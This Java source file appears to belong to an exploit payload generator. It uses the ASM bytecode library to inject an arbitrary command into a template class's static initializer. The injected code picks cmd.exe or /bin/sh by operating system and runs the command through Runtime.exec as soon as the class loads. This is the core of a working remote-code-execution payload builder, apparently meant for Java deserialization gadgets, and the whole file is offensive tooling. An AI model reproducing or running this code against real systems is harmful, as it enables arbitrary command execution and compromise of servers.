package util;

import java.io.InputStream;
import java.util.Locale;

import org.objectweb.asm.*;
import org.objectweb.asm.commons.AnalyzerAdapter;
import org.objectweb.asm.commons.GeneratorAdapter;
import org.objectweb.asm.commons.Method;


/**
 * @Classname Transformers
 * @Description Insert command to the template classfile
 * @Author Welkin
 */
public class Transformers {

    public static byte[] insertCommand(InputStream inputStream, String command) throws Exception{

        ClassReader cr = new ClassReader(inputStream);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        ClassVisitor cv = new TransformClass(cw,command);

        cr.accept(cv, ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES);
        return cw.toByteArray();
    }

    static class TransformClass extends ClassVisitor{

        String command;

        TransformClass(ClassVisitor classVisitor, String command){
            super(Opcodes.ASM7,classVisitor);
            this.command = command;
        }

        @Override
        public MethodVisitor visitMethod(
                final int access,
                final String name,
                final String descriptor,
                final String signature,
                final String[] exceptions) {
            MethodVisitor mv = cv.visitMethod(access, name, descriptor, signature, exceptions);
            if(name.equals("<clinit>")){
                return new TransformMethod(mv, command);
            }else{
                return mv;
            }
        }
    }

    static class TransformMethod extends MethodVisitor  {

        String command;

        TransformMethod(MethodVisitor methodVisitor, String command) {
            super(Opcodes.ASM7, methodVisitor);
            this.command = command;
        }

        @Override
        public void visitCode(){
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            mv.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception");
            mv.visitLabel(label0);

            Label ifLabel = new Label();
            Label elseLabel = new Label();
            Label outLabel = new Label();

            visitLdcInsn("os.name");
            visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/System", "getProperty", "(Ljava/lang/String;)Ljava/lang/String;", false);
            visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "toLowerCase", "()Ljava/lang/String;", false);
            visitVarInsn(Opcodes.ASTORE, 0);

            visitLabel(ifLabel);
            visitVarInsn(Opcodes.ALOAD, 0);
            visitLdcInsn("window");
            visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "indexOf", "(Ljava/lang/String;)I", false);
            visitInsn(Opcodes.ICONST_M1);
            visitJumpInsn(Opcodes.IF_ICMPLE, elseLabel);
            createArray("cmd.exe", "/c");
            visitJumpInsn(Opcodes.GOTO, outLabel);

            visitLabel(elseLabel);
            createArray("/bin/sh", "-c");

            visitLabel(outLabel);
            mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            mv.visitVarInsn(Opcodes.ALOAD, 1);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            mv.visitInsn(Opcodes.POP);
            mv.visitLabel(label1);
            Label label3 = new Label();
            mv.visitJumpInsn(Opcodes.GOTO, label3);
            mv.visitLabel(label2);
            mv.visitVarInsn(Opcodes.ASTORE, 0);
            mv.visitVarInsn(Opcodes.ALOAD, 0);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false);
            mv.visitLabel(label3);
        }

        private void createArray(String cmd, String opt) {
            visitIntInsn(Opcodes.BIPUSH, 3);
            visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
            visitInsn(Opcodes.DUP);
            visitInsn(Opcodes.ICONST_0);
            visitLdcInsn(cmd);
            visitInsn(Opcodes.AASTORE);

            visitInsn(Opcodes.DUP);
            visitInsn(Opcodes.ICONST_1);
            visitLdcInsn(opt);
            visitInsn(Opcodes.AASTORE);

            visitInsn(Opcodes.DUP);
            visitInsn(Opcodes.ICONST_2);
            visitLdcInsn(command);
            visitInsn(Opcodes.AASTORE);

            mv.visitVarInsn(Opcodes.ASTORE, 1);
        }

    }
}
